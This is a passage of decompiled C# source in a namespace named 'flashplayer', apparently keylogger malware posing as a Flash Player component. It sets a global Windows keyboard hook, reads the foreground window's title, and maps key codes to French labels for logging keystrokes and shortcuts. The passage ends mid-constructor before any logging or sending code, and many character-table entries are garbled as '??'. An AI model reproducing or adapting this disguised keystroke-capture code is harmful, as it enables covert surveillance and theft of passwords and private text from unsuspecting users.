using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using flashplayer.My;

namespace flashplayer;

public class fonc
{
	private delegate int KeyboardHookDelegate(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private class KeyCode
	{
		private int _kCode;

		private string _kShft;

		private string _kBase;

		private string _kCtrl;

		private string _kAlt;

		private string _kWin;

		private string _kAltGr;

		private string _kWinShft;

		private string _kWinCtrl;

		private string _kAltShft;

		private string _kAltCtrl;

		private int _kAccTrans;

		public int Code
		{
			get
			{
				return _kCode;
			}
			set
			{
				_kCode = value;
			}
		}

		public string Ret_Shft
		{
			get
			{
				return _kShft;
			}
			set
			{
				_kShft = value;
			}
		}

		public string Ret_Base
		{
			get
			{
				return _kBase;
			}
			set
			{
				_kBase = value;
			}
		}

		public string Ret_Ctrl
		{
			get
			{
				return _kCtrl;
			}
			set
			{
				_kCtrl = value;
			}
		}

		public string Ret_Alt
		{
			get
			{
				return _kAlt;
			}
			set
			{
				_kAlt = value;
			}
		}

		public string Ret_Win
		{
			get
			{
				return _kWin;
			}
			set
			{
				_kWin = value;
			}
		}

		public string Ret_AltGr
		{
			get
			{
				return _kAltGr;
			}
			set
			{
				_kAltGr = value;
			}
		}

		public string Ret_WinShft
		{
			get
			{
				return _kWinShft;
			}
			set
			{
				_kWinShft = value;
			}
		}

		public string Ret_WinCtrl
		{
			get
			{
				return _kWinCtrl;
			}
			set
			{
				_kWinCtrl = value;
			}
		}

		public string Ret_AltShft
		{
			get
			{
				return _kAltShft;
			}
			set
			{
				_kAltShft = value;
			}
		}

		public int Ret_AccTrans
		{
			get
			{
				return _kAccTrans;
			}
			set
			{
				_kAccTrans = value;
			}
		}

		public KeyCode(int kCode, string kBase = "", string kShft = "", string kCtrl = "", string kAlt = "", string kWin = "", string kAltGr = "", string kWinShft = "", string kWinCtrl = "", string kAltShft = "", int kAccTrans = 0)
		{
			Code = kCode;
			Ret_Shft = kShft;
			Ret_Base = kBase;
			Ret_Ctrl = kCtrl;
			Ret_Alt = kAlt;
			Ret_Win = kWin;
			Ret_AltGr = kAltGr;
			Ret_WinShft = kWinShft;
			Ret_WinCtrl = kWinCtrl;
			Ret_AltShft = kAltShft;
			Ret_AccTrans = kAccTrans;
		}
	}

	private class Keycodes
	{
		private ArrayList Table;

		public KeyCode this[int lIndex] => (KeyCode)Table[lIndex];

		public Keycodes()
		{
			Table = new ArrayList();
		}

		public KeyCode Add(int Code, string Ret_Base = "", string Ret_Shft = "", string Ret_Ctrl = "", string Ret_AltGr = "", string Ret_Alt = "", string Ret_Win = "", string Ret_WinShft = "", string Ret_WinCtrl = "", string Ret_AltShft = "", int Ret_AccTrans = 0)
		{
			KeyCode keyCode = new KeyCode(Code, Ret_Base, Ret_Shft, Ret_Ctrl, Ret_Alt, Ret_Win, Ret_AltGr, Ret_WinShft, Ret_WinCtrl, Ret_AltShft, Ret_AccTrans);
			Table.Add(keyCode);
			return keyCode;
		}
	}

	private int int_0;

	private short short_0;

	private int int_1;

	private int int_2;

	private IntPtr intptr_0;

	private string string_0;

	private KeyboardHookDelegate keyboardHookDelegate_0;

	public string string_1;

	public string string_2;

	private bool bool_0;

	private bool bool_1;

	private bool bool_2;

	private bool bool_3;

	private bool bool_4;

	private bool bool_5;

	private bool bool_6;

	private bool bool_7;

	private bool bool_8;

	private bool bool_9;

	private bool bool_10;

	private bool bool_11;

	private char char_0;

	private bool bool_12;

	private string string_3;

	private Keycodes keycodes_0;

	private string[,] string_4;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int int_3);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int int_3, KeyboardHookDelegate keyboardHookDelegate_1, int int_4, int int_5);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int int_3, int int_4, int int_5, KBDLLHOOKSTRUCT kbdllhookstruct_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_5, int int_4);

	public fonc()
	{
		int_0 = 257;
		short_0 = 256;
		int_1 = 260;
		int_2 = 261;
		intptr_0 = (IntPtr)0;
		string_0 = "";
		keyboardHookDelegate_0 = null;
		bool_0 = false;
		bool_1 = false;
		bool_2 = false;
		bool_3 = false;
		bool_4 = false;
		bool_5 = false;
		bool_6 = false;
		bool_7 = false;
		bool_8 = false;
		bool_9 = false;
		bool_10 = false;
		bool_11 = false;
		char_0 = '\0';
		bool_12 = ((Computer)MyProject.MyComputer_0).get_Keyboard().get_CapsLock();
		string_3 = "";
		keycodes_0 = new Keycodes();
		string_4 = new string[512, 2]
		{
			{ "0", "" },
			{ "1", "???" },
			{ "2", "???" },
			{ "3", "???" },
			{ "4", "???" },
			{ "5", "???" },
			{ "6", "???" },
			{ "7", "???" },
			{ "8", "???" },
			{ "9", "???" },
			{ "10", "???" },
			{ "11", "???" },
			{ "12", "???" },
			{ "13", "???" },
			{ "14", "???" },
			{ "15", "???" },
			{ "16", "???" },
			{ "17", "???" },
			{ "18", "???" },
			{ "19", "???" },
			{ "20", "??" },
			{ "21", "??" },
			{ "22", "???" },
			{ "23", "???" },
			{ "24", "???" },
			{ "25", "???" },
			{ "26", "???" },
			{ "27", "???" },
			{ "28", "???" },
			{ "29", "???" },
			{ "30", "???" },
			{ "31", "???" },
			{ "32", " " },
			{ "33", "!" },
			{ "34", "\"" },
			{ "35", "#" },
			{ "36", "$" },
			{ "37", "%" },
			{ "38", "&" },
			{ "39", "'" },
			{ "40", "(" },
			{ "41", ")" },
			{ "42", "*" },
			{ "43", "+" },
			{ "44", "," },
			{ "45", "-" },
			{ "46", "." },
			{ "47", "/" },
			{ "48", "0" },
			{ "49", "1" },
			{ "50", "2" },
			{ "51", "3" },
			{ "52", "4" },
			{ "53", "5" },
			{ "54", "6" },
			{ "55", "7" },
			{ "56", "8" },
			{ "57", "9" },
			{ "58", ":" },
			{ "59", ";" },
			{ "60", "<" },
			{ "61", "=" },
			{ "62", ">" },
			{ "63", "?" },
			{ "64", "@" },
			{ "65", "A" },
			{ "66", "B" },
			{ "67", "C" },
			{ "68", "D" },
			{ "69", "E" },
			{ "70", "F" },
			{ "71", "G" },
			{ "72", "H" },
			{ "73", "I" },
			{ "74", "J" },
			{ "75", "K" },
			{ "76", "L" },
			{ "77", "M" },
			{ "78", "N" },
			{ "79", "O" },
			{ "80", "P" },
			{ "81", "Q" },
			{ "82", "R" },
			{ "83", "S" },
			{ "84", "T" },
			{ "85", "U" },
			{ "86", "V" },
			{ "87", "W" },
			{ "88", "X" },
			{ "89", "Y" },
			{ "90", "Z" },
			{ "91", "[" },
			{ "92", "\\" },
			{ "93", "]" },
			{ "94", "^" },
			{ "95", "_" },
			{ "96", "`" },
			{ "97", "a" },
			{ "98", "b" },
			{ "99", "c" },
			{ "100", "d" },
			{ "101", "e" },
			{ "102", "f" },
			{ "103", "g" },
			{ "104", "h" },
			{ "105", "i" },
			{ "106", "j" },
			{ "107", "k" },
			{ "108", "l" },
			{ "109", "m" },
			{ "110", "n" },
			{ "111", "o" },
			{ "112", "p" },
			{ "113", "q" },
			{ "114", "r" },
			{ "115", "s" },
			{ "116", "t" },
			{ "117", "u" },
			{ "118", "v" },
			{ "119", "w" },
			{ "120", "x" },
			{ "121", "y" },
			{ "122", "z" },
			{ "123", "{" },
			{ "124", "|" },
			{ "125", "}" },
			{ "126", "~" },
			{ "127", "???" },
			{ "128", "??" },
			{ "129", "??" },
			{ "130", "??" },
			{ "131", "??" },
			{ "132", "??" },
			{ "133", "??" },
			{ "134", "??" },
			{ "135", "??" },
			{ "136", "??" },
			{ "137", "??" },
			{ "138", "??" },
			{ "139", "??" },
			{ "140", "??" },
			{ "141", "??" },
			{ "142", "??" },
			{ "143", "??" },
			{ "144", "??" },
			{ "145", "??" },
			{ "146", "??" },
			{ "147", "??" },
			{ "148", "??" },
			{ "149", "??" },
			{ "150", "??" },
			{ "151", "??" },
			{ "152", "??" },
			{ "153", "??" },
			{ "154", "??" },
			{ "155", "??" },
			{ "156", "??" },
			{ "157", "??" },
			{ "158", "??" },
			{ "159", "??" },
			{ "160", "??" },
			{ "161", "??" },
			{ "162", "??" },
			{ "163", "??" },
			{ "164", "??" },
			{ "165", "??" },
			{ "166", "??" },
			{ "167", "??" },
			{ "168", "??" },
			{ "169", "??" },
			{ "170", "??" },
			{ "171", "??" },
			{ "172", "??" },
			{ "173", "??" },
			{ "174", "??" },
			{ "175", "??" },
			{ "176", "???" },
			{ "177", "???" },
			{ "178", "???" },
			{ "179", "???" },
			{ "180", "???" },
			{ "181", "??" },
			{ "182", "??" },
			{ "183", "??" },
			{ "184", "??" },
			{ "185", "???" },
			{ "186", "???" },
			{ "187", "???" },
			{ "188", "???" },
			{ "189", "??" },
			{ "190", "??" },
			{ "191", "???" },
			{ "192", "???" },
			{ "193", "???" },
			{ "194", "???" },
			{ "195", "???" },
			{ "196", "???" },
			{ "197", "???" },
			{ "198", "??" },
			{ "199", "??" },
			{ "200", "???" },
			{ "201", "???" },
			{ "202", "???" },
			{ "203", "???" },
			{ "204", "???" },
			{ "205", "???" },
			{ "206", "???" },
			{ "207", "??" },
			{ "208", "??" },
			{ "209", "??" },
			{ "210", "??" },
			{ "211", "??" },
			{ "212", "??" },
			{ "213", "??" },
			{ "214", "??" },
			{ "215", "??" },
			{ "216", "??" },
			{ "217", "???" },
			{ "218", "???" },
			{ "219", "???" },
			{ "220", "???" },
			{ "221", "??" },
			{ "222", "??" },
			{ "223", "???" },
			{ "224", "??" },
			{ "225", "??" },
			{ "226", "??" },
			{ "227", "??" },
			{ "228", "??" },
			{ "229", "??" },
			{ "230", "??" },
			{ "231", "??" },
			{ "232", "??" },
			{ "233", "??" },
			{ "234", "??" },
			{ "235", "??" },
			{ "236", "??" },
			{ "237", "??" },
			{ "238", "\u00af" },
			{ "239", "\u00b4" },
			{ "240", "\u00ad" },
			{ "241", "??" },
			{ "242", "???" },
			{ "243", "??" },
			{ "244", "??" },
			{ "245", "??" },
			{ "246", "???" },
			{ "247", "\u00b8" },
			{ "248", "??" },
			{ "249", "\u00a8" },
			{ "250", "??" },
			{ "251", "??" },
			{ "252", "??" },
			{ "253", "??" },
			{ "254", "???" },
			{ "255", "\u00a0" },
			{ "0", "" },
			{ "1", "" },
			{ "2", "" },
			{ "3", "" },
			{ "4", "" },
			{ "5", "" },
			{ "6", "" },
			{ "7", "" },
			{ "8", "" },
			{ "9", "" },
			{ "10", "" },
			{ "11", "" },
			{ "12", "" },
			{ "13", "" },
			{ "14", "" },
			{ "15", "" },
			{ "16", "" },
			{ "17", "" },
			{ "18", "" },
			{ "19", "" },
			{ "20", "" },
			{ "21", "" },
			{ "22", "" },
			{ "23", "" },
			{ "24", "" },
			{ "25", "" },
			{ "26", "" },
			{ "27", "" },
			{ "28", "" },
			{ "29", "" },
			{ "30", "" },
			{ "31", "" },
			{ "032", " " },
			{ "033", "!" },
			{ "034", "\"" },
			{ "035", "#" },
			{ "036", "$" },
			{ "037", "%" },
			{ "038", "&" },
			{ "039", "'" },
			{ "040", "(" },
			{ "041", ")" },
			{ "042", "*" },
			{ "043", "+" },
			{ "044", "," },
			{ "045", "-" },
			{ "046", "." },
			{ "047", "/" },
			{ "048", "0" },
			{ "049", "1" },
			{ "050", "2" },
			{ "051", "3" },
			{ "052", "4" },
			{ "053", "5" },
			{ "054", "6" },
			{ "055", "7" },
			{ "056", "8" },
			{ "057", "9" },
			{ "058", ":" },
			{ "059", ";" },
			{ "060", "<" },
			{ "061", "=" },
			{ "062", ">" },
			{ "063", "?" },
			{ "064", "@" },
			{ "065", "A" },
			{ "066", "B" },
			{ "067", "C" },
			{ "068", "D" },
			{ "069", "E" },
			{ "070", "F" },
			{ "071", "G" },
			{ "072", "H" },
			{ "073", "I" },
			{ "074", "J" },
			{ "075", "K" },
			{ "076", "L" },
			{ "077", "M" },
			{ "078", "N" },
			{ "079", "O" },
			{ "080", "P" },
			{ "081", "Q" },
			{ "082", "R" },
			{ "083", "S" },
			{ "084", "T" },
			{ "085", "U" },
			{ "086", "V" },
			{ "087", "W" },
			{ "088", "X" },
			{ "089", "Y" },
			{ "090", "Z" },
			{ "091", "[" },
			{ "092", "\\" },
			{ "093", "]" },
			{ "094", "^" },
			{ "095", "_" },
			{ "096", "`" },
			{ "097", "a" },
			{ "098", "b" },
			{ "099", "c" },
			{ "0100", "d" },
			{ "0101", "e" },
			{ "0102", "f" },
			{ "0103", "g" },
			{ "0104", "h" },
			{ "0105", "i" },
			{ "0106", "j" },
			{ "0107", "k" },
			{ "0108", "l" },
			{ "0109", "m" },
			{ "0110", "n" },
			{ "0111", "o" },
			{ "0112", "p" },
			{ "0113", "q" },
			{ "0114", "r" },
			{ "0115", "s" },
			{ "0116", "t" },
			{ "0117", "u" },
			{ "0118", "v" },
			{ "0119", "w" },
			{ "0120", "x" },
			{ "0121", "y" },
			{ "0122", "z" },
			{ "0123", "{" },
			{ "0124", "|" },
			{ "0125", "}" },
			{ "0126", "~" },
			{ "0127", "\u007f" },
			{ "0128", "???" },
			{ "0129", "\u0081" },
			{ "0130", "???" },
			{ "0131", "??" },
			{ "0132", "???" },
			{ "0133", "???" },
			{ "0134", "???" },
			{ "0135", "???" },
			{ "0136", "??" },
			{ "0137", "???" },
			{ "0138", "??" },
			{ "0139", "???" },
			{ "0140", "??" },
			{ "0141", "\u008d" },
			{ "0142", "??" },
			{ "0143", "\u008f" },
			{ "0144", "\u0090" },
			{ "0145", "???" },
			{ "0146", "???" },
			{ "0147", "\"" },
			{ "148", "\"" },
			{ "0149", "???" },
			{ "0150", "???" },
			{ "0151", "???" },
			{ "0152", "\u02dc\u02dc" },
			{ "0153", "???" },
			{ "0154", "??" },
			{ "0155", "???" },
			{ "0156", "??" },
			{ "0157", "\u009d" },
			{ "0158", "??" },
			{ "0159", "??" },
			{ "0160", "\u00a0" },
			{ "0161", "??" },
			{ "0162", "??" },
			{ "0163", "??" },
			{ "0164", "??" },
			{ "0165", "??" },
			{ "0166", "??" },
			{ "0167", "??" },
			{ "0168", "\u00a8" },
			{ "0169", "??" },
			{ "0170", "??" },
			{ "0171", "??" },
			{ "0172", "??" },
			{ "0173", "\u00ad" },
			{ "0174", "??" },
			{ "0175", "\u00af" },
			{ "0176", "??" },
			{ "0177", "??" },
			{ "0178", "??" },
			{ "0179", "??" },
			{ "0180", "\u00b4" },
			{ "0181", "??" },
			{ "0182", "??" },
			{ "0183", "??" },
			{ "0184", "\u00b8" },
			{ "0185", "??" },
			{ "0186", "??" },
			{ "0187", "??" },
			{ "0188", "??" },
			{ "0189", "??" },
			{ "0190", "??" },
			{ "0191", "??" },
			{ "0192", "??" },
			{ "0193", "??" },
			{ "0194", "??" },
			{ "0195", "??" },
			{ "0196", "??" },
			{ "0197", "??" },
			{ "0198", "??" },
			{ "0199", "??" },
			{ "0200", "??" },
			{ "0201", "??" },
			{ "0202", "??" },
			{ "0203", "??" },
			{ "0204", "??" },
			{ "0205", "??" },
			{ "0206", "??" },
			{ "0207", "??" },
			{ "0208", "??" },
			{ "0209", "??" },
			{ "0210", "??" },
			{ "0211", "??" },
			{ "0212", "??" },
			{ "0213", "??" },
			{ "0214", "??" },
			{ "0215", "??" },
			{ "0216", "??" },
			{ "0217", "??" },
			{ "0218", "??" },
			{ "0219", "??" },
			{ "0220", "??" },
			{ "0221", "??" },
			{ "0222", "??" },
			{ "0223", "??" },
			{ "0224", "??" },
			{ "0225", "??" },
			{ "0226", "??" },
			{ "0227", "??" },
			{ "0228", "??" },
			{ "0229", "??" },
			{ "0230", "??" },
			{ "0231", "??" },
			{ "0232", "??" },
			{ "0233", "??" },
			{ "0234", "??" },
			{ "0235", "??" },
			{ "0236", "??" },
			{ "0237", "??" },
			{ "0238", "??" },
			{ "0239", "??" },
			{ "0240", "??" },
			{ "0241", "??" },
			{ "0242", "??" },
			{ "0243", "??" },
			{ "0244", "??" },
			{ "0245", "??" },
			{ "0246", "??" },
			{ "0247", "??" },
			{ "0248", "??" },
			{ "0249", "??" },
			{ "0250", "??" },
			{ "0251", "??" },
			{ "0252", "??" },
			{ "0253", "??" },
			{ "0254", "??" },
			{ "0255", "??" }
		};
		keycodes_0.Add(0);
		keycodes_0.Add(1, "[CLIC GAUCHE]");
		keycodes_0.Add(2, "[CLIC DROIT]");
		keycodes_0.Add(3, "[ANNULATION]");
		keycodes_0.Add(4, "[CLIC BOUTON MILIEU]");
		keycodes_0.Add(5, "[CLIC BOUTON 4]");
		keycodes_0.Add(6, "[CLIC BOUTON 5]");
		keycodes_0.Add(7);
		keycodes_0.Add(8, "[RETOUR ARRIERE]");
		keycodes_0.Add(9, "[TABULATION]", "", "", "[PERMUTATION FENETRE GAUCHE]", "[PERMUTATION FENETRE DROITE]", "[FLIP 3D DROITE]", "[FLIP 3D GAUCHE]", "[FIGER LE FLIP 3D]");
		keycodes_0.Add(10);
		keycodes_0.Add(11);
		keycodes_0.Add(12, "[NETTOYER]");
		keycodes_0.Add(13, Environment.NewLine + "[ENTER]");
		keycodes_0.Add(14);
		keycodes_0.Add(15);
		keycodes_0.Add(16, "[SHIFT]", "", "", "", "[BASCULER CLAVIER]");
		keycodes_0.Add(17, "[CONTROL]");
		keycodes_0.Add(18, "[ALT]");
		keycodes_0.Add(19, "[PAUSE]", "", "", "", "", "[PANNEAU INFOS SYS]");
		keycodes_0.Add(20, "[CAPS LOCK]");
		keycodes_0.Add(21);
		keycodes_0.Add(22);
		keycodes_0.Add(23);
		keycodes_0.Add(24);
		keycodes_0.Add(25);
		keycodes_0.Add(26);
		keycodes_0.Add(27, "[ECHAP]", "", "", "", "[PARCOURIR LES FENETRES]", "[MENU DEMARRER]");
		keycodes_0.Add(28);
		keycodes_0.Add(29);
		keycodes_0.Add(30);
		keycodes_0.Add(31);
		keycodes_0.Add(32, " ", "", "", "", "[MENU CONTEXTUEL]", "", "", "", "", 1);
		keycodes_0.Add(33, "[???]");
		keycodes_0.Add(34, "[???]");
		keycodes_0.Add(35, "[FIN / FIN LIGNE]", "[SLCT CURSEUR-FIN LIGNE]", "[FIN DOCUMENT]");
		keycodes_0.Add(36, "[DEBUT / DEBUT LIGNE]", "[SLCT DEBUT LIGNE-CURSEUR]", "[DEBUT DOCUMENT]");
		keycodes_0.Add(37, "[GAUCHE]", "[SLCT GAUCHE]", "[DPL GAUCHE PAR GROUPE]", "", "[DPL GAUCHE PAR GROUPE]");
		keycodes_0.Add(38, "[HAUT]", "[SLCT HAUT]");
		keycodes_0.Add(39, "[DROIT]", "[SLCT DROITE]", "[DPL DROITE PAR GROUPE]", "", "[DPL DROITE PAR GROUPE]");
		keycodes_0.Add(40, "[BAS]", "[SLCT BAS]");
		keycodes_0.Add(41, "[SELECTION]");
		keycodes_0.Add(42, "[IMRPIMER");
		keycodes_0.Add(43, "[EXECUTER]");
		keycodes_0.Add(44, "[IMPRIM ECRAN]", "", "", "", "[SCREENSHOT FENETRE EN COURS]");
		keycodes_0.Add(45, "[INSERER]", "[INSERER PRESSE PAPIER]");
		keycodes_0.Add(46, "[SUPPRIMER]", "[SUPPRIMER ??? OU SUPPRIMER FICHIER]", "[SUPPRIMER RESTE DE LA LIGNE]", "[GESTIONNAIRE DE TACHES]");
		keycodes_0.Add(47, "[AIDE]");
		keycodes_0.Add(48, "??", "0", "", "@", "", "", "", "", "", 1);
		keycodes_0.Add(49, "&", "1", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(50, "??", "2", "", "~", "", "", "", "", "", 1);
		keycodes_0.Add(51, "\"", "3", "", "#", "", "", "", "", "", 1);
		keycodes_0.Add(52, "'", "4", "", "{", "", "", "", "", "", 1);
		keycodes_0.Add(53, "(", "5", "", "[", "", "", "", "", "", 1);
		keycodes_0.Add(54, "-", "6", "", "|", "", "", "", "", "", 1);
		keycodes_0.Add(55, "??", "7", "", "`", "", "", "", "", "", 1);
		keycodes_0.Add(56, "_", "8", "", "\\", "", "", "", "", "", 1);
		keycodes_0.Add(57, "??", "9", "", "^", "", "", "", "", "", 1);
		keycodes_0.Add(58);
		keycodes_0.Add(59);
		keycodes_0.Add(60);
		keycodes_0.Add(61);
		keycodes_0.Add(62);
		keycodes_0.Add(63);
		keycodes_0.Add(64);
		keycodes_0.Add(65, "a", "A", "[SELECTIONNER TOUT]", "", "", "", "", "", "", 2);
		keycodes_0.Add(66, "b", "B", "[ORGANISER FAVORIS]", "", "", "", "", "", "", 1);
		keycodes_0.Add(67, "c", "C", "[COPIER (CTRL+C)]", "", "", "", "", "", "", 1);
		keycodes_0.Add(68, "d", "D", "", "", "", "[REDUIRE TOUT]", "", "", "", 1);
		keycodes_0.Add(69, "e", "E", "", "", "", "[EXPLORATEUR]", "", "", "", 2);
		keycodes_0.Add(70, "f", "F", "[RECHERCHER]", "", "", "[RECHERCHER]", "", "[RECHERCHER UN PC]", "", 1);
		keycodes_0.Add(71, "g", "G", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(72, "h", "H", "[REMPLACER]", "", "", "", "", "", "", 1);
		keycodes_0.Add(73, "i", "I", "", "", "", "", "", "", "", 2);
		keycodes_0.Add(74, "j", "J", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(75, "k", "K", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(76, "l", "L", "", "", "", "[VERROUILLER SESSION]", "", "", "", 1);
		keycodes_0.Add(77, "m", "M", "", "", "", "[REDUIRE TOUT]", "[RESTAURER TOUT]", "", "", 1);
		keycodes_0.Add(78, "n", "N", "[NOUVEAU]", "", "", "", "", "", "", 2);
		keycodes_0.Add(79, "o", "O", "[OUVRIR]", "", "", "", "", "", "", 2);
		keycodes_0.Add(80, "p", "P", "[IMPRIMER]", "", "", "", "", "", "", 1);
		keycodes_0.Add(81, "q", "Q", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(82, "r", "R", "", "", "", "[EXECUTER]", "", "", "", 1);
		keycodes_0.Add(83, "s", "S", "[ENREGISTRER]", "", "", "", "", "", "", 1);
		keycodes_0.Add(84, "t", "T", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(85, "u", "U", "", "", "", "[GESTIONNAIRE UTILS]", "", "", "", 2);
		keycodes_0.Add(86, "v", "V", "[COLLER (CTRL+V]]", "", "", "", "", "", "", 1);
		keycodes_0.Add(87, "w", "W", "[FERMER (ALT+F4)]", "", "", "", "", "", "", 1);
		keycodes_0.Add(88, "x", "X", "[COUPER (CTRL+X)]", "", "", "[CENTRE MOBILITE]", "", "", "", 1);
		keycodes_0.Add(89, "y", "Y", "[RETABLIR]", "", "", "", "", "", "", 1);
		keycodes_0.Add(90, "z", "Z", "[ANNULER]", "", "", "", "", "", "", 1);
		keycodes_0.Add(91, "[WIN GAUCHE]");
		keycodes_0.Add(92, "[WIN DROITE]");
		keycodes_0.Add(93, "[APPLICATION]");
		keycodes_0.Add(94);
		keycodes_0.Add(95, "[VEILLE]");
		keycodes_0.Add(96, "0", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(97, "1", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(98, "2", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(99, "3", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(100, "4", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(101, "5", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(102, "6", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(103, "7", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(104, "8", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(105, "9", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(106, "*", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(107, "+", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(108, "[SEPARATEUR]", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(109, "-", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(110, ".", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(111, "/", "", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(112, "[AIDE (F1)]", "", "", "", "", "[AIDE WINDOWS (ALT+F1)]");
		keycodes_0.Add(113, "[RENOMMER (F2)]");
		keycodes_0.Add(114, "[RECHERCHER (F3)]");
		keycodes_0.Add(115, "[F4]", "", "", "", "[FERMER PROGRAMME (ALT+F4)]");
		keycodes_0.Add(116, "[RAFRAICHIR (F5)]");
		keycodes_0.Add(117, "[F6]");
		keycodes_0.Add(118, "[F7]");
		keycodes_0.Add(119, "[F8]");
		keycodes_0.Add(120, "[F9]");
		keycodes_0.Add(121, "[ACTIVER BARRE MENU (F10)]");
		keycodes_0.Add(122, "[F11]");
		keycodes_0.Add(123, "[F12]");
		keycodes_0.Add(124, "[F13]");
		keycodes_0.Add(125, "[F14]");
		keycodes_0.Add(126, "[F15]");
		keycodes_0.Add(127, "[F16]");
		keycodes_0.Add(128, "[F17]");
		keycodes_0.Add(129, "[F18]");
		keycodes_0.Add(130, "[F19]");
		keycodes_0.Add(131, "[F20]");
		keycodes_0.Add(132, "[F21]");
		keycodes_0.Add(133, "[F22]");
		keycodes_0.Add(134, "[F23]");
		keycodes_0.Add(135, "[F24]");
		keycodes_0.Add(136);
		keycodes_0.Add(137);
		keycodes_0.Add(138);
		keycodes_0.Add(139);
		keycodes_0.Add(140);
		keycodes_0.Add(141);
		keycodes_0.Add(142);
		keycodes_0.Add(143);
		keycodes_0.Add(144, "[VERR NUM]");
		keycodes_0.Add(145, "[ARRET DEFIL]");
		keycodes_0.Add(146);
		keycodes_0.Add(147);
		keycodes_0.Add(148);
		keycodes_0.Add(149);
		keycodes_0.Add(150);
		keycodes_0.Add(151);
		keycodes_0.Add(152);
		keycodes_0.Add(153);
		keycodes_0.Add(154);
		keycodes_0.Add(155);
		keycodes_0.Add(156);
		keycodes_0.Add(157);
		keycodes_0.Add(158);
		keycodes_0.Add(159);
		keycodes_0.Add(160, "[SHIFT GAUCHE]");
		keycodes_0.Add(161, "[SHIFT DROITE]");
		keycodes_0.Add(162, "[CONTROL GAUCHE]");
		keycodes_0.Add(163, "[CONTROL DROITE]");
		keycodes_0.Add(164, "[ALT GAUCHE]");
		keycodes_0.Add(165, "[ALT DROITE]");
		keycodes_0.Add(166, "[NAVIG +]");
		keycodes_0.Add(167, "[NAVIG -]");
		keycodes_0.Add(168, "[NAVIG RAFRAICHIR]");
		keycodes_0.Add(169, "[NAVIG STOP]");
		keycodes_0.Add(170, "[NAVIG RECHERCHER]");
		keycodes_0.Add(171, "[NAVIG FAVORIS]");
		keycodes_0.Add(172, "[NAVIG HOME]");
		keycodes_0.Add(173, "[COUPER SON]");
		keycodes_0.Add(174, "[VOL -]");
		keycodes_0.Add(175, "[VOL +]");
		keycodes_0.Add(176, "[PISTE +]");
		keycodes_0.Add(177, "[PISTE -]");
		keycodes_0.Add(178, "[STOP]");
		keycodes_0.Add(179, "[MARCHE/PAUSE]");
		keycodes_0.Add(180, "[MAIL]");
		keycodes_0.Add(181, "[MEDIA]");
		keycodes_0.Add(182, "[APPLICATION 1]");
		keycodes_0.Add(183, "[APPLICATION 2]");
		keycodes_0.Add(184);
		keycodes_0.Add(185);
		keycodes_0.Add(186, "$", "??", "", "??", "", "", "", "", "", 1);
		keycodes_0.Add(187, "=", "+", "", "}", "", "", "", "", "", 1);
		keycodes_0.Add(188, ",", "?", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(189);
		keycodes_0.Add(190, ";", ".", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(191, ":", "/", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(192, "??", "%", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(193);
		keycodes_0.Add(194);
		keycodes_0.Add(195);
		keycodes_0.Add(196);
		keycodes_0.Add(197);
		keycodes_0.Add(198);
		keycodes_0.Add(199);
		keycodes_0.Add(200);
		keycodes_0.Add(201);
		keycodes_0.Add(202);
		keycodes_0.Add(203);
		keycodes_0.Add(204);
		keycodes_0.Add(205);
		keycodes_0.Add(206);
		keycodes_0.Add(207);
		keycodes_0.Add(208);
		keycodes_0.Add(209);
		keycodes_0.Add(210);
		keycodes_0.Add(211);
		keycodes_0.Add(212);
		keycodes_0.Add(213);
		keycodes_0.Add(214);
		keycodes_0.Add(215);
		keycodes_0.Add(216);
		keycodes_0.Add(217);
		keycodes_0.Add(218);
		keycodes_0.Add(219, ")", "??", "", "]", "", "", "", "", "", 1);
		keycodes_0.Add(220, "*", "??", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(221, "^", "\u00a8", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(222);
		keycodes_0.Add(223, "!", "??", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(224);
		keycodes_0.Add(225);
		keycodes_0.Add(226, "<", ">", "", "", "", "", "", "", "", 1);
		keycodes_0.Add(227);
		keycodes_0.Add(228);
		keycodes_0.Add(229, "[PROCESS]");
		keycodes_0.Add(230);
		keycodes_0.Add(231);
		keycodes_0.Add(232);
		keycodes_0.Add(233);
